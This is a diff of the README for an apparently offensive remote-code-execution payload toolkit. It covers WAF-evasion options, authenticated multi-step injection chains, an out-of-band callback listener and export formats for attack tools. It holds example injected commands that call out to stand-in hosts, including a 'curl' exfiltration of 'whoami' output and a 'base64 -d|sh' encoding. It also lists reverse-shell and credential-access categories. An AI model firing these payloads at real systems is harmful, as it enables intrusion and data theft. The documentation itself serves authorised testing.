-Because a delay proves only that the target *waited* — not a value it computed —
-timing is reported `needs-review`, **never** `confirmed` on its own. Run it
-alongside `--methods reflected`: if the results-based method confirms, you have an
-execution proof, and the linear timing response corroborates it. This keeps the
-two tiers honest — a blind timing candidate is never dressed up as proven
-execution.
-
-### WAF posture (`--evade`)
-
-By default the detection methods send **clean, canonical payloads** — fewer
-variants, clearer confirmation, and the lowest false-positive rate. This assumes
-authorised, WAF-free access (ask the org for a WAF-bypass path rather than
-fighting the filter). `--evade low` opts into a **single, low-touch** transform
-for the Unix shell probes — `${IFS}` in place of spaces — drawn from the existing
-shell-bypass vocabulary:
-
-```bash
-python rcekit.py --acknowledge-consent --environments unix \
-  --verify-url "https://target.example/lookup?host=FUZZ" --methods reflected --evade low
-```
-
-This is deliberately minimal, not aggressive or noisy evasion. It applies to the
-shell command probes (`reflected`, `time`); the file-write probe stays canonical
-because `${IFS}` around its `>` redirect would break it, and expression probes
-(`eval`) are unaffected.
-
-**Safe by default.** Verification fires only low-impact proofs (enumeration,
-file reads, code-execution and WAF-bypass signatures). Reverse shells,
-download-execute, credential access, lateral movement, container escape,
-cloud-metadata and OOB payloads are all held back unless you raise the ceiling
-with `--verify-active-risk intrusive` (independent of `--max-safety`, which only
-governs file output). Before anything is fired, an **execution plan** prints the
-request, the number of unique payloads, the safety-tier breakdown, any
-high-impact categories, and every network / out-of-band callback destination.
-
-Rate-limit with `--verify-delay` and cap with `--max-payloads`. OOB payloads are
-sent but confirmed out-of-band (see below). **Destructive payloads (persistence,
-backdoors, security-control tampering) are never fired at the target unless you
-pass `--verify-allow-destructive`.** Requires `--acknowledge-consent`; every run
-is audited to `exploit_audit.log`.
-
-## Multi-step / Session-aware Verification
-
-A single `--verify-url` request cannot reach sinks that sit behind authentication,
-carry the injection in **uploaded file content**, or execute **blind/async**.
-`--verify-chain <profile.json>` drives an ordered, cookie-aware request chain
-(login → CSRF extraction → prerequisite requests → payload delivery → trigger) and
-confirms execution either **in-band** (the payload's `match` oracle against a chosen
-step's response) or **out-of-band** (a `{callback}` URL received by the built-in
-listener).
+A single request can't reach sinks behind a login, carried in **uploaded file
+content**, or executed **blind/async**. `--verify-chain <profile.json>` drives an
+ordered, cookie-aware chain (login → CSRF extraction → prerequisites → payload
+delivery → trigger) and confirms **in-band** (a `match` oracle on a chosen step) or
+**out-of-band** (a `{callback}` URL received by the built-in listener).
 
 Each step is `method` + `path` (+ optional `headers`) with one body of `body`
-(raw), `json` (string), `form` (object) or `multipart`
-(`{"fields": {...}, "file": {"field","filename","content"}}`). `FUZZ` marks where
-the payload lands (including inside uploaded file content); `{var}` is substituted
-from earlier steps' `extract` (`{var: regex-with-one-capture-group}`), and `{token}`
-is a per-payload unique value (e.g. for a unique upload filename).
+(raw), `json`, `form`, or `multipart`. `FUZZ` marks the payload (including inside
+uploaded file content); `{var}` is substituted from an earlier step's `extract`,
+and `{token}` is a per-payload unique value.
 
 ```json
 {
   "base": "https://target.example",
-  "callback_host": "10.0.0.5", "listen_port": 8877,
-  "confirm_step": "trigger",
+  "callback_host": "10.0.0.5", "listen_port": 8877, "confirm_step": "trigger",
   "steps": [
-    {"name": "csrf",  "method": "GET",  "path": "/login", "extract": {"csrf": "csrf_token\" value=\"([^\"]+)"}},
-    {"name": "login", "method": "POST", "path": "/login", "form": {"csrf": "{csrf}", "user": "u", "pass": "p"}},
-    {"name": "upload","method": "POST", "path": "/import", "multipart": {"file": {"field": "f", "filename": "x_{token}.sql", "content": "FUZZ"}}},
-    {"name": "trigger","method": "POST","path": "/import/run", "json": "{\"file\": \"x_{token}.sql\"}"}
+    {"name": "csrf",   "method": "GET",  "path": "/login", "extract": {"csrf": "csrf_token\" value=\"([^\"]+)"}},
+    {"name": "login",  "method": "POST", "path": "/login", "form": {"csrf": "{csrf}", "user": "u", "pass": "p"}},
+    {"name": "upload", "method": "POST", "path": "/import", "multipart": {"file": {"field": "f", "filename": "x_{token}.sql", "content": "FUZZ"}}},
+    {"name": "trigger","method": "POST", "path": "/import/run", "json": "{\"file\": \"x_{token}.sql\"}"}
   ]
 }
 ```
@@ -488,13 +297,15 @@ python rcekit.py --acknowledge-consent --environments postgres --categories code
   --contexts raw --encodings none --verify-active-risk intrusive --verify-chain chain.json
 ```
 
-## Out-of-Band Listener
+</details>
 
-`--listen` receives OOB callbacks and correlates each to the payload that produced
-it, via the token in a `.map.jsonl` manifest — no separate interactsh required.
+<details>
+<summary><b>Out-of-band listener</b> — confirm blind RCE without interactsh/Collaborator</summary>
+
+`--listen` receives OOB HTTP/DNS callbacks and correlates each to the payload that
+produced it, via the token in a `.map.jsonl` manifest:
 
 ```bash
-# generate OOB payloads (writes oob.txt + oob.txt.map.jsonl), then listen
 python rcekit.py --acknowledge-consent --categories oob \
   --oob-domain your-id.oob.example.com --output oob.txt
 python rcekit.py --listen --correlate oob.txt.map.jsonl \
@@ -505,28 +316,110 @@ python rcekit.py --listen --correlate oob.txt.map.jsonl \
 [HIT] http token=8k2hn1ufohpv from 10.0.0.5 -> ; curl http://8k2hn1ufohpv.oob.example.com/ [oob/raw]
 ```
 
-Correlates by token in the callback host **or** path (so exfil like
-`curl http://token.dom/$(whoami)` still maps). For real engagements point the OOB
-domain's NS/A records here (port 53 needs root); for lab use aim payloads straight
+Correlates by token in the callback host **or** path, so exfil like
+`curl http://token.dom/$(whoami)` still maps. Point the OOB domain's NS/A records
+here for real engagements (port 53 needs root); for lab use aim payloads straight
 at the listener.
 
-## Output Formats & Integrations
+</details>
 
-- **`text` / `jsonl`** — payloads (or full JSONL records). A `<output>.map.jsonl` manifest is written for every payload that has an oracle — a correlation `token` or a machine-readable `match` regex — so a callback, reflected canary, or command-output signature is traceable to one payload and auto-confirmable.
-- **`burp`** — a `<output>_burp/` directory of deduplicated, watermark-free wordlists split per context (`payloads-<context>.txt`) plus a combined `payloads-all.txt`. Load a list as a Burp Intruder payload set and set the injection point from your captured request. A `request.txt` (with Burp's `§…§` position marker) is written **only** when a `--target-profile` supplies a real request — no generic placeholder is fabricated.
-- **`ffuf`** — a `<output>_ffuf/` directory with the same wordlists and, when a `--target-profile` supplies a `request` block, a ready-to-run `request.txt` (with a real `FUZZ` marker) and an executable `run.sh` (`ffuf -request request.txt -w payloads-all.txt -request-proto <scheme>`). Without a request there is nowhere to inject, so only the wordlists are written and a warning is printed.
-- **`nuclei`** — a `<output>_nuclei/` directory of runnable templates grouped by environment and oracle: OOB (`interactsh_protocol`), time-based (`duration>=6`), and reflection (canary in body). For the fullest pack, run `--detection-only --output-format nuclei`.
+<details>
+<summary><b>Reference</b> — environments, categories, contexts, encodings, sinks</summary>
 
-The `burp`/`ffuf` wordlists honour whatever `--encodings` you selected: each distinct final payload is emitted as a literal line, so self-contained variants like `base64_decode_exec` (which Burp/ffuf can't reproduce with a processing rule) are kept. For a raw-only list, generate with `--encodings none`.
+**Environments:** `unix`, `windows`, `nodejs`, `python`, `php`, `java`, `dotnet`,
+`ruby`, `perl`, `go`, `docker`, `kubernetes`, `graphql`, `mongodb`.
 
-## Safety & Ethics
+**Categories:** `basic_enum`, `file_operations`, `network_operations`,
+`code_execution`, `download_execute`, `reverse_shells`, `credential_access`,
+`privilege_escalation`, `persistence`, `cloud_metadata`, `database_enumeration`,
+`lateral_movement`, `container_escape`, `waf_bypass`, `oob`, `nosql_injection`,
+`graphql_injection`.
 
-- **Consent gate** — exploitation generation and `--verify-url` require `--acknowledge-consent`; `--detection-only` is benign and does not.
-- **Audit log** — every exploitation/verification run is recorded in `exploit_audit.log`. `--watermark` additionally embeds a traceable token in each payload.
-- **Safety tiers** — `safe` / `intrusive` / `stateful`, filtered by `--max-safety` (stateful and blocking probes are excluded by default).
-- **Logging** — execution logs go to `rcekit.log`.
+**Contexts** (each carries an escape rule so the payload survives its container):
+*Language / structural break-outs* (default): `raw`, `html`, `attribute`,
+`attribute_unquoted`, `javascript`, `sql`, `php`, `unix_shell`, `windows_cmd`,
+`powershell`, `shell_single_quoted`, `shell_double_quoted`, `graphql_string`.
+*Transport / serialization* (opt-in): `json`, `graphql_variable`, `xml`,
+`xml_cdata`, `yaml`, `http_header`.
 
-This toolkit is intended for authorised penetration testing, security research and
+**Encodings:** default self-contained set — `none`, `url_encode`,
+`double_url_encode`, `random_case` (case-insensitive runners), `base64_decode_exec`
+(carries its own `base64 -d|sh`). Decoder-required blobs (`base64`, `hex`,
+`base64_then_url`, `double_base64`) are opt-in and only fire where the sink itself
+decodes the input.
+
+**Code-execution sinks** (for `--categories code_execution`): Node
+(`child_process_exec`, `*_ssti`, `vm_eval`, `deserialization`, `expression_template`),
+Python (`os_system`, `subprocess`, `jinja2_ssti`, `exec_ast`), Postgres
+(`psql_meta_command`), PHP (`exec_system`, `eval`, `deserialize`), Java
+(`runtime_exec`, `freemarker/velocity/thymeleaf_ssti`, `spel`, `ognl`, `groovy`,
+`deserialization`), .NET (`process_start`, `deserialize`), Ruby (`kernel_system`,
+`erb_ssti`), Perl (`system_backticks`), Go (`os_exec`), Mongo
+(`operator_injection`, `where_js`, `server_side_js`), GraphQL (`introspection`,
+`injection`, `batching`).
+
+</details>
+
+<details>
+<summary><b>Full option reference</b></summary>
+
+| Option | Description | Default |
+|--------|-------------|---------|
+| `--verify-url` | Authorised target URL with a `FUZZ` marker | None |
+| `-r`, `--request-file` | Raw HTTP request to inject into (mark with `FUZZ`/`*` or `-p`) | None |
+| `-p`, `--param` | Parameter/field/header/cookie to inject into for `-r` | None |
+| `--request-scheme {http,https}` | Scheme for the URL built from `-r` | auto |
+| `--methods <list>` | Detection methods: `reflected`, `eval`, `file`, `time` | None |
+| `--webroot` / `--web-base-url` | (file method) server write dir / URL that serves it | None |
+| `--time-base <seconds>` | (time method) base delay `N`; regression fires `0/N/2N` | `2.0` |
+| `--evade {none,low}` | WAF posture; `low` = minimal `${IFS}`-for-spaces on shell probes | `none` |
+| `--verify-data` / `--verify-header` / `--verify-method` | Body (with `FUZZ`) / repeatable header / HTTP method | — |
+| `--verify-url-location` / `--verify-body-location` | Encode the payload at the URL / body point | `query_value` / auto |
+| `--verify-delay` / `--verify-timeout` | Seconds between requests / per-request timeout | `0` / `8` |
+| `--verify-active-risk` | Highest safety tier verification may fire (`safe`/`intrusive`/`stateful`) | `safe` |
+| `--verify-allow-destructive` | Allow destructive payloads (persistence/backdoors) | Off |
+| `--verify-chain <profile.json>` | Multi-step, session-aware verification | None |
+| `--listen` + `--correlate <map.jsonl>` | Run the OOB listener and map callbacks to payloads | Off |
+| `--listen-http-port` / `--listen-dns-port` / `--listen-answer-ip` / `--listen-log` | Listener settings | `8080` / `5335` / `127.0.0.1` / — |
+| `--oob-domain` | Collaborator/interactsh domain; each payload gets a unique subdomain | None |
+| `-o, --output` | Output file (or base directory for `burp`/`nuclei`) | `rce_payloads.txt` |
+| `--output-format` | `text`, `jsonl`, `burp`, `ffuf`, `nuclei` | `text` |
+| `--environments` / `--categories` / `--contexts` / `--encodings` | Restrict generation | All / default sets |
+| `--max-payloads` | Cap payloads (balanced round-robin sample) | Unlimited |
+| `--detection-only` | Benign canary/timing probes for safe validation | Off |
+| `--target-profile` | JSON profile of the target (supplies defaults) | None |
+| `--deny-chars` / `--max-length` | Drop payloads with these chars / longer than this | None |
+| `--sink-needs-separator` / `--sink-blind` / `--sink-decodes` | Narrow generation to the sink's shape | Off |
+| `--attacker-ip` / `--attacker-domain` | Substituted into reverse-shell / download payloads | `192.168.1.100` / `attacker.com` |
+| `--template-file` | Custom JSON payload templates | `templates/payloads.json` |
+| `--include-metadata` | Write a `.meta.jsonl` sidecar (indicators, tiers, notes) | Off |
+| `--max-safety` / `--include-blocking` | Highest safety tier / include blocking probes | `safe`–`intrusive` / Off |
+| `--watermark` | Embed a traceable token in each payload | Off |
+| `--acknowledge-consent` | Required to generate/fire exploitation payloads | Off |
+| `--doctor` | Check corpus integrity and exit non-zero if missing/empty | Off |
+
+</details>
+
+---
+
+## Safety &amp; ethics
+
+- **Consent gate** — exploitation generation and verification require
+  `--acknowledge-consent`; `--detection-only` is benign and does not.
+- **Safe by default** — verification fires only low-impact proofs; reverse shells,
+  download-execute, credential access, lateral movement, container escape,
+  cloud-metadata and OOB payloads are held back until you raise
+  `--verify-active-risk`. Destructive payloads (persistence, backdoors) are never
+  fired without `--verify-allow-destructive`. An **execution plan** prints exactly
+  what will be sent before anything fires.
+- **Safety tiers** — `safe` / `intrusive` / `stateful`, filtered by `--max-safety`.
+- **Audit &amp; logging** — every exploitation/verification run is recorded in
+  `exploit_audit.log`; `--watermark` embeds a traceable token; execution logs go to
+  `rcekit.log`.
+- If the payload corpus is missing or corrupt, RCEKit refuses to run and exits
+  non-zero instead of silently generating nothing (`--doctor` checks it).
+
+This toolkit is intended for authorised penetration testing, security research,
 education, and defensive training only. **Never use it against systems without
 explicit permission** — unauthorized testing is illegal.
 
@@ -536,10 +429,10 @@ explicit permission** — unauthorized testing is illegal.
 python -m unittest discover -s tests   # dependency-free test suite
 ```
 
-Contributions welcome — new sinks/categories, encodings, environments, bug fixes,
-and docs. Payload bases live in editable JSON templates
-(`templates/payloads.json`), so most coverage can be extended without touching the
-Python source.
+Contributions welcome — new sinks/categories, encodings, environments, detection
+methods, bug fixes, and docs. Payload bases live in editable JSON templates
+(`templates/payloads.json`), so most coverage extends without touching the Python
+source. See [CONTRIBUTING.md](CONTRIBUTING.md).
 
 ## License
 
